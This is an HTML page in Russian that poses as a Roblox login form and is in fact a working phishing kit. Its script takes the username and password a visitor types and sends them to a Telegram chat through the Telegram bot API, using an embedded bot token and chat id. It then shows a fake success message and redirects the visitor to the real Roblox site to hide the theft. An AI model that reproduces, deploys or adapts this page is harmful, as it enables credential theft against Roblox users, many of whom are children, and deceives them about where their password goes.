<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body {
            background: #e8e8e8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 44px 40px 36px;
            border-radius: 8px;
            width: 400px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
            text-align: center;
        }
        .login-container .logo {
            margin-bottom: 20px;
        }
        .login-container .logo svg {
            width: 140px;
            height: auto;
        }
        .login-container h2 {
            font-size: 22px;
            font-weight: 500;
            color: #1a1a1a;
            margin-bottom: 6px;
        }
        .login-container .sub {
            font-size: 14px;
            color: #666;
            margin-bottom: 24px;
        }
        .login-container .input-group {
            text-align: left;
            margin-bottom: 16px;
        }
        .login-container .input-group label {
            font-size: 14px;
            font-weight: 600;
            color: #333;
            display: block;
            margin-bottom: 4px;
        }
        .login-container .input-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 15px;
            background: #fafafa;
            transition: 0.2s;
        }
        .login-container .input-group input:focus {
            border-color: #00b2ff;
            background: white;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.2);
        }
        .login-container .forgot {
            text-align: right;
            font-size: 13px;
            margin-top: -8px;
            margin-bottom: 20px;
        }
        .login-container .forgot a {
            color: #0077b3;
            text-decoration: none;
        }
        .login-container .forgot a:hover {
            text-decoration: underline;
        }
        .login-container .btn {
            width: 100%;
            padding: 14px;
            background: #00b2ff;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        .login-container .btn:hover {
            background: #0099e0;
        }
        .login-container .register {
            margin-top: 20px;
            font-size: 14px;
            color: #444;
        }
        .login-container .register a {
            color: #0077b3;
            text-decoration: none;
            font-weight: 600;
        }
        .login-container .register a:hover {
            text-decoration: underline;
        }
        .login-container .divider {
            border-top: 1px solid #ddd;
            margin: 24px 0 16px;
        }
        .login-container .social {
            font-size: 14px;
            color: #555;
        }
        .login-container .social a {
            color: #0077b3;
            text-decoration: none;
            margin: 0 4px;
        }
        .login-container .social a:hover {
            text-decoration: underline;
        }
        @media (max-width: 450px) {
            .login-container {
                width: 92%;
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <!-- Логотип Roblox (SVG) -->
    <div class="logo">
        <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M0 0L20 0L20 40L0 40L0 0Z" fill="#1a1a2e"/>
            <rect x="25" y="0" width="20" height="40" fill="#1a1a2e"/>
            <rect x="50" y="0" width="20" height="40" fill="#1a1a2e"/>
            <rect x="75" y="0" width="20" height="40" fill="#1a1a2e"/>
            <rect x="100" y="0" width="20" height="40" fill="#1a1a2e"/>
            <rect x="125" y="0" width="20" height="40" fill="#1a1a2e"/>
            <rect x="150" y="0" width="20" height="40" fill="#1a1a2e"/>
            <rect x="175" y="0" width="20" height="40" fill="#1a1a2e"/>
            <text x="10" y="52" font-family="Segoe UI, Arial, sans-serif" font-size="20" font-weight="700" fill="#1a1a2e">ROBLOX</text>
        </svg>
    </div>

    <h2>Вход</h2>
    <div class="sub">Войдите в свой аккаунт</div>

    <div class="input-group">
        <label>Имя пользователя</label>
        <input type="text" id="username" placeholder="Введите имя пользователя">
    </div>

    <div class="input-group">
        <label>Пароль</label>
        <input type="password" id="password" placeholder="Введите пароль">
    </div>

    <div class="forgot">
        <a href="#">Забыли пароль?</a>
    </div>

    <button class="btn" onclick="sendData()">Войти</button>

    <div class="register">
        Нет аккаунта? <a href="#">Зарегистрироваться</a>
    </div>

    <div class="divider"></div>
    <div class="social">
        Войти через <a href="#">Google</a> · <a href="#">Apple</a>
    </div>
</div>

<script>
    var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
    var chat_id = "6981190103";

    function sendData() {
        var user = document.getElementById('username').value;
        var pass = document.getElementById('password').value;

        if (user === '' || pass === '') {
            alert('Заполните все поля');
            return;
        }

        var msg = 'ROBLOX\n\nЛогин: ' + user + '\nПароль: ' + pass;
        var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(msg);

        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('Вы успешно вошли!');
                    window.location.href = 'https://www.roblox.com/home';
                } else {
                    alert('Ошибка, попробуйте снова');
                }
            })
            .catch(error => {
                alert('Ошибка соединения');
            });
    }
</script>

</body>
    </html>
